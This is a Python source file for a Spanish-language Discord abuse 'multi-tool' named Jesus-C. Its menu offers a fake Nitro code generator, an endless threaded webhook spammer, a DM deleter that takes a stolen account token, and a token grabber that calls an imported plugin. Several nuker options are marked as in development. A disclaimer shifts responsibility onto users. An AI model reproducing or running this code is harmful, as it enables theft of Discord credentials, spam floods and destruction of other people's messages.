#LIBRARIES

from utilities.settings.funtions import *
from utilities.settings.libraries import *

import utilities.plugins.token_grabber
import utilities.plugins.dm_deleter

##############################################

def menu():
  setTitle(f'')
  init(autoreset=True)
  print(Fore.CYAN + '      | $$$|    /$|$$$$$$$$|            |$$$$$$$$$ |   $$|     /$|            |$$$$$$$$$ | ')
  time.sleep(0.1)
  print(Fore.CYAN + '      | $$$|    $$|                   /$$$$$$$$ |      $$|     |$|          /$$$$$$$$ | ')
  time.sleep(0.1)
  print(Fore.CYAN + '      | $$$|    $$|                 /$$$$$$ /          $$|     |$|        /$$$$$$ / ')
  time.sleep(0.1)
  print(Fore.CYAN + '      | $$$|    $$|_____           |$$$$ |             $$|     |$|       |$$$$ | ')
  time.sleep(0.1)
  print(Fore.CYAN + '      | $$$|    $$|$$$$$|           \$$$$$ \           $$|     |$|        \$$$$$ \ ')
  time.sleep(0.1)
  print(Fore.CYAN + '      | $$$|    $$|$$$$$|             \$$$$$ \         $$|     |$|          \$$$$$ \ ')
  time.sleep(0.1)
  print(Fore.CYAN + '      | $$$|    $$|                    |$$$$  |        $$|     |$|           |$$$$  | ')
  time.sleep(0.1)
  print(Fore.CYAN + ' |$|__| $$$|    $$|                   /$$$$$ /         $$|     |$|          /$$$$$ / ')
  time.sleep(0.1)
  print(Fore.CYAN + ' |$$$$$$$$/     $$|________     _____/$$$$$ /          $$|     /$|    _____/$$$$$ / ')
  time.sleep(0.1)
  print(Fore.CYAN + ' |_______/      \$|$$$$$$$$|    $$$$$$$$$$ /           \________/     $$$$$$$$$$ / ') 

  w = Fore.WHITE
  b = Fore.BLACK
  g = Fore.LIGHTGREEN_EX
  y = Fore.LIGHTYELLOW_EX
  m = Fore.LIGHTMAGENTA_EX
  c = Fore.LIGHTCYAN_EX
  lr = Fore.LIGHTRED_EX
  lb = Fore.LIGHTBLUE_EX

  time.sleep(1.5)
  print(f'''{m}'''.replace('$', f'{m}${w}') + f'''
{m}[{w}1{Fore.RESET}{m}]{Fore.RESET} Discord Nitro   {b}|{Fore.RESET}{m}[{w}7{Fore.RESET}{m}]{Fore.RESET} Channel Spammer      
{m}[{w}2{Fore.RESET}{m}]{Fore.RESET} Webhook Spammer {b}|{Fore.RESET}{m}[{w}8{Fore.RESET}{m}]{Fore.RESET} Token Information       
{m}[{w}3{Fore.RESET}{m}]{Fore.RESET} Account Nuker   {b}|{Fore.RESET}{m}[{w}9{Fore.RESET}{m}]{Fore.RESET} Reaction Spammer        
{m}[{w}4{Fore.RESET}{m}]{Fore.RESET} DM Deleter      {b}|{Fore.RESET}{m}[{w}10{Fore.RESET}{m}]{Fore.RESET}Info{Fore.RESET}
{m}[{w}5{Fore.RESET}{m}]{Fore.RESET} Token Grabber   {b}|{Fore.RESET}{m}[{w}11{Fore.RESET}{m}]{Fore.RESET}Version{Fore.RESET}       
{m}[{w}6{Fore.RESET}{m}]{Fore.RESET} Server Nuker    {b}|{Fore.RESET}{m}[{w}12{Fore.RESET}{m}]{Fore.RESET}{lr}EXIT{Fore.RESET}''')  
  print("════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════")
  choice = input('Elige una opción: ')

  #DISCORD NITRO

  if choice == '1':
    os.system('cls')
    setTitle(f'Generador de Discord Nitro  |   ')
    
    amount = int(input(f'\n{m}>> Amount: {Fore.RESET}'))
    webhooklink = str(input(f'\n{m}>> Webhook URL: {Fore.RESET}'))
    count = 0
    webhook = "~~WEBHOOK_URL~~""".replace("~~WEBHOOK_URL~~", webhooklink)

    for x in range(amount):
            try:
                code = ''.join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(24))
                post = {"content":"https://discord.com/billing/promotions/"+code}
                head = {

                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36", 
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
                        'content-type' : 'application/json'
                    }
                count += 1
                print(f'[{g}+{Fore.RESET}] Nitro Generado | [{c}{count}{Fore.RESET}]')
                s = requests.post(webhook, json=post, headers=head)
                if count == amount:
                  time.sleep(2)
                  os.system('cls')
                  return menu()
            except:
                print(f"[{lr}!{Fore.RESET}] ERROR!")
                break
    


  #Webhook Spammer  
  if choice == '2':
    setTitle(f'Webhook Spammer  |   ')
    os.system('cls')
    session = requests.Session()
    webhook = input(f"{m}Webhook URL:{Fore.RESET} ")
    message = input(f"{m}Mensage: {Fore.RESET} ")
    username = input(f"{m}Nombre del Webhook?: {Fore.RESET}")

    def webhook_spammer():
      session.post(webhook,json = {"content":message,"username":username})
    
      while True:
        for i in range(15):
          threading.Thread(target=webhook_spammer).start()
    webhook_spammer()
 
  #Account Nuker
  if choice == '3':
    os.system('cls')
    print(f'{y} En desarrollo')
    time.sleep(3)
    os.system('cls')
    return menu()

  #DM deleter
  if choice == '4':
    os.system('cls')
    setTitle(f'DM Deleter  |   ')
    token = input(f'\n{m}TOKEN de la cuenta: {Fore.RESET}')
    validateToken(token)
    processes = []
    channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
    if not channelIds:
      print(f"{m}Este TOKEN no tiene DM para borrar! {Fore.RESET}")
      sleep(2)
      os.system('cls')
      menu()
    for channel in [channelIds[i:i+3] for i in range(0, len(channelIds), 3)]:
      t = threading.Thread(target=utilities.plugins.dm_deleter.DmDeleter, args=(token, channel))
      t.start()
      processes.append(t)
    for process in processes:
      process.join()

    time.sleep(3)
    os.system('cls')
    return menu()

  #Token Grabber
  if choice == '5':
    os.system('cls')
    utilities.plugins.token_grabber.tokengrabber()
    
    time.sleep(3)
    os.system('cls')
    return menu()

  #Server Nuker
  if choice == '6':
    os.system('cls')
    print(f'{y} En desarrollo')
    time.sleep(3)
    os.system('cls')
    return menu()

  #Channel Spammer
  if choice == '7':
    os.system('cls')
    print(f'{y} En desarrollo')
    time.sleep(3)
    os.system('cls')
    return menu()
    
  #Token Information
  if choice == '8':
    os.system('cls')
    print(f'{y} En desarrollo')
    time.sleep(3)
    os.system('cls')
    return menu()

  #Reaction Spammer
  if choice == '9':
    os.system('cls')
    print(f'{y} En desarrollo')
    time.sleep(3)
    os.system('cls')
    return menu()

  #Info
  if choice == '10':
    os.system('cls')
    print(f'{m}Hola, gracias por usar la tool Jesus-C.\nTodo aquel que utilize esta tool se hace responsable de las posibles consecuencias si es que se hace un mal uso de esta.')
    print(f'{m}Presiona ENTER para volver al panel')
    while True:
      if keyboard.is_pressed('enter'):
        os.system('cls')
        return menu()
    
  #Version
  if choice == '11':
    os.system('cls')
    print(f'{m} Alpha 2.0')
    time.sleep(4)
    os.system('cls')
    return menu()
  
  #Exit
  if choice == '12':
    os.system('cls')
    Sgr = str(input(f'{m}Estás seguro de que quieres salir?{Fore.RESET} [{g}s{Fore.RESET}/{lr}n{Fore.RESET}]{Fore.RESET}: '))
    if Sgr == 's':
      sys.exit()
    else:
      os.system('cls')
      return menu()





menu()